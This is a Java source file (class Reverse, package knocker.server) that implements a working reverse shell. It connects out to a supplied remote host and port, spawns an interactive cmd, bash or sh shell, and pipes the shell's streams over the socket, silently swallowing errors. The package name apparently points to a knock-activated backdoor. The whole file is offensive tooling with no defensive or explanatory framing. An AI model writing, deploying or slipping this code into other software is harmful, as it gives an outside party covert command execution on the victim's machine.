package knocker.server;

import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;

/**
 * Creates a process for a shell and TCP connection to a specified host.
 * The shell and socket are piped to each other.
**/
public class Reverse extends Thread {
	
	/**
	 * The remote address to connect to
	**/
	private InetAddress inetAddress;
	
	/**
	 * The remote port to connect to
	**/
	private int port;
	
	/**
	 * Creates a reverse shell to a specified host.
	 * @param inetAddress The remote address to connect to
	 * @param port The remote port to connect to
	**/
	private Reverse(InetAddress inetAddress, int port) {
		this.inetAddress = inetAddress;
		this.port = port;
		this.start();
	}
	
	/**
	 * Checks if a specific process can be executed.
	 * @param arg The process to execute
	 * @return true if the process or command is available otherwise false
	**/
	public static boolean test(String arg) {
		try {
			new ProcessBuilder(arg).start().destroy();
			return true;
		} catch (IOException e) {
			//Swallow
		}
		return false;
	}
	
	/**
	 * Pipes the Socket and Process to each other until one closes.
	**/
	@Override
	public void run() {
		try {
			Socket s = new Socket(inetAddress, port);
			Process proc = null;
			
			if (System.getProperty("os.name").toLowerCase().contains("win")) {
				proc = new ProcessBuilder("cmd").start();
			} else {
				proc = new ProcessBuilder(test("bash") ? "bash" : "sh", "-i").start();
			}
			
			Pipe p1 = new Pipe(proc.getInputStream(), s.getOutputStream());
			Pipe p2 = new Pipe(proc.getErrorStream(), s.getOutputStream());
			Pipe p3 = new Pipe(s.getInputStream(), proc.getOutputStream());
			
			p1.join();
			p2.join();
			p3.join();
			
			proc.waitFor();
			s.close();
		} catch (Exception e) {
			// Swallow
		}
	}
	
	/**
	 * A static wrapper method for the constructor.
	 * @param byName The host to connect to
	 * @param v The port on the host to connect to
	 */
	public static void connect(InetAddress byName, int v) {
		new Reverse(byName, v);
	}
}
